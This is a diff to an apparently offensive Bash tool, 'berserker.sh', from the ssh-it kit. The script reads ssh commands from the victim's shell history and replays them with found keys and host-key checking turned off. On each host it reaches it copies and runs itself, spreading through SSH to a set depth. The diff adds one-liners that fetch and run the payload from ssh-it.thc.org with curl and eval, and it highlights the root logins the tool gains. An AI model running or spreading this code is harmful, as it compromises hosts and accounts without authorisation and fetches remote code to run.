@@ -6,8 +6,11 @@ CG="\033[1;32m" # green
 CR="\033[1;31m" # red
 CC="\033[1;36m" # cyan
 CM="\033[1;35m" # magenta
+CW="\033[1;37m" # magenta
 CF="\033[2m"    # faint
 CN="\033[0m"    # none
+
+CBG="\033[42;1m" # Background Green
 
 # night-mode
 CDY="\033[0;33m" # yellow
@@ -98,11 +101,16 @@ funcs_init()
 		[[ -z $THC_BASEDIR ]] && ERREXIT 45 "THC_BASEDIR= is not set and ~/.prng/seed not found"
 	fi
 }
+
 #! /usr/bin/env bash
 
+# -----BEGIN berserker.sh-----
+#
 # This script might be executed 'in memory' with one of these two commands:
 #      bash -c "$(cat src/funcs src/berserker.sh)"
 #      bash -c "$(cat bs)"
+#      export BS="$(curl -fsSL ssh-it.thc.org/bs)" && bash -c "$BS"
+#      bash -c "IFS='' BS=\"\$(curl -fsSL ssh-it.thc.org/bs)\" && eval \$BS"
 # If this case we can not source funcs and must hope that BS contains ourself.
 BINDIR="$(cd "$(dirname "${0}")" || exit; pwd)"
 if [[ "$0" != "bash" ]]; then
@@ -283,8 +291,9 @@ DX="│   │   │   │   │   │   │   │   │   │   "
 		if [[ -n $lf_missing ]] || [[ -n $lf_missing_try ]]; then
 			unset lf_missing
 			local l
-			l="$((COLUMNS-4-2-${#dx}-${#2}))"
-			printf "\r${dx}├── %-${l}.${l}s ${CDR}${2}${CN}\n" "ssh ${_bs_msg_try_last}"
+			l="$((COLUMNS-4-2-${#dx}-${#2} + n_esc))"
+
+			printf "\r${dx}├── %-${l}.${l}b ${CDR}${2}${CN}\n" "ssh ${_bs_msg_try_last}"
 			return
 		fi
 
@@ -301,8 +310,21 @@ DX="│   │   │   │   │   │   │   │   │   │   "
 
 		local l
 		l="$((COLUMNS-4-19-${#dx}))"
-		printf "${dx}├── %-${l}.${l}s %17s"  "ssh ${2}" "${3}"
+
+		# Highlight root logins. Fiddle to use %*.*s correctly with ANSI color codes
+		n_esc=0 # Extra ANSI codes not displayed but counted by printf(3)
 		_bs_msg_try_last="${2}"
+		len="${#_bs_msg_try_last}"
+		_bs_msg_try_last="${2/root@/${CG}root${CN}@}"
+		[[ "${len}" -ne "${#_bs_msg_try_last}" ]] && n_esc=11
+
+		len="${#_bs_msg_try_last}"
+		_bs_msg_try_last="${_bs_msg_try_last/-l root /-l ${CG}root${CN} }"
+		[[ "${len}" -ne "${#_bs_msg_try_last}" ]] && n_esc=$((n_esc + 11))
+
+		l="$((l + n_esc))"
+		printf "${dx}├── %-${l}.${l}b %17s"  "ssh ${_bs_msg_try_last}" "${3}"
+
 		lf_missing_try=1
 	}
 
@@ -313,11 +335,11 @@ DX="│   │   │   │   │   │   │   │   │   │   "
 		dx="${DX:0:$((${1}*4))}"
 
 		local l
-		l="$((COLUMNS-4-4-${#dx}))"
+		l="$((COLUMNS-4-4-${#dx} + n_esc))"
 
 		[[ -n $lf_missing ]] && echo ""
 		lf_missing=1
-		printf "\r${dx}├── %-${l}.${l}s ${CDG}OK${CN}" "ssh $_bs_msg_try_last"
+		printf "\r${dx}├── %-${l}.${l}b ${CDG}OK${CN}" "ssh $_bs_msg_try_last"
 	}
 
 	M_MSG_DEPTH_REACHED()
@@ -336,22 +358,14 @@ DX="│   │   │   │   │   │   │   │   │   │   "
 		if [[ -n $lf_missing ]]; then
 			unset lf_missing
 			local l
-			l="$((COLUMNS-4-4-${#dx}))"
-			printf "\r${dx}├── %-${l}.${l}s ${CDG}OK${CN}\n" "ssh -i${kstr} ${_bs_msg_try_last}"
+			l="$((COLUMNS-4-4-${#dx} + n_esc))"
+
+			printf "\r${dx}├── %-${l}.${l}b ${CDG}OK${CN}\n" "ssh -i${kstr} ${_bs_msg_try_last}"
 			return
 		fi
 
 		printf "${dx}│   └── [${CDY}COMPLETE${CDM}${kstr}${CN}]${CL}\n" 
 	}
-
-	M_MSG_TRY_FAIL()
-	{
-		printf "\r"
-	}
-
-	M_MSG_LINK() { :;}
-
-	M_MSG_TRY_OK_CALLER() { :;}
 
 	M_MSG_FAILED()
 	{
@@ -382,7 +396,7 @@ DX="│   │   │   │   │   │   │   │   │   │   "
 
 	MSG_DEPTH_REACHED()
 	{
-		echo "|D|$(BS_THIS_DEPTH)|${_BS_ID}|"
+		echo "|D|${BS_THIS_DEPTH}|${_BS_ID}|"
 	}
 
 	MSG_TRY_OK_CALLER()
@@ -408,8 +422,10 @@ DX="│   │   │   │   │   │   │   │   │   │   "
 
 ### -----BEGIN INIT VARS #2-----
 set_myidonce
-[[ -z $_BS_IS_MASTER ]] && { MSG_TRY_OK_CALLER; }
-[[ -n $BS_THIS_DEPTH ]] && [[ "$BS_THIS_DEPTH" -ge "$BS_DEPTH" ]] && { MSG_DEPTH_REACHED; exit; } # TRUE, early exit 
+if [[ -z $_BS_IS_MASTER ]]; then
+	MSG_TRY_OK_CALLER
+	[[ -n $BS_THIS_DEPTH ]] && [[ "$BS_THIS_DEPTH" -ge "$BS_DEPTH" ]] && { MSG_DEPTH_REACHED; exit; } # TRUE, early exit 
+fi
 ### -----END INIT VARS #2-----
 
 
@@ -497,6 +513,8 @@ done
 ############################
 if [[ -n $BS_HISTFILE ]]; then
 	hfile="${BS_HISTFILE}" && [[ -f "${hfile}" ]] && SSH_CMDS+="$(cat "${hfile}" | eval $BASH_HST_SSH)"
+elif [[ -n $BS_ZSH_HISTFILE ]]; then
+	hfile="${BS_ZSH_HISTFILE}" && [[ -f "${hfile}" ]] && SSH_CMDS+="$(cat "${hfile}" | eval $ZSH_HST_SSH)"
 else	
 	hfile="${HOME}/.zsh_history" && [[ -f "${hfile}" ]] && SSH_CMDS+="$(cat "${hfile}" | eval $ZSH_HST_SSH)"
 	hfile="${HOME}/.bash_history" && [[ -f "${hfile}" ]] && SSH_CMDS+="$(cat "${hfile}" | eval $BASH_HST_SSH)"
@@ -549,7 +567,7 @@ for c in "${CMD_LIST[@]}"; do
 	MSG_TRY "$c" "${n}/${#CMD_LIST[@]}"
 	n_total=$((n_total+=1))
 	ret=0
-	{ err="$( { command ssh "-o" "BatchMode=yes" "-o" "ConnectTimeout=2" "-o" "StrictHostKeyChecking=no" "${KEYS_ARGV[@]}" -v -T -n $c \
+	{ err="$( { command ssh "-o" "BatchMode=yes" "-o" "ConnectTimeout=2" "-o" "StrictHostKeyChecking=no" "${KEYS_ARGV[@]}" -v $c \
 			"export BS='$_BS'; _BS_ID_CALLER=\"${_BS_ID}\" _BS_LOOPDB=\"${_BS_LOOPDB}\" \
 			THC_DEBUG=\"$THC_DEBUG\" BS_HISTFILE=\"${BS_HISTFILE}\" BS_DEPTH=\"$BS_DEPTH\" \
 			BS_THIS_DEPTH=\"$((BS_THIS_DEPTH+1))\" bash -c \"\$BS\""; } 2>&1 1>&3 3>&- )"; } 3>&1 || ret=$?
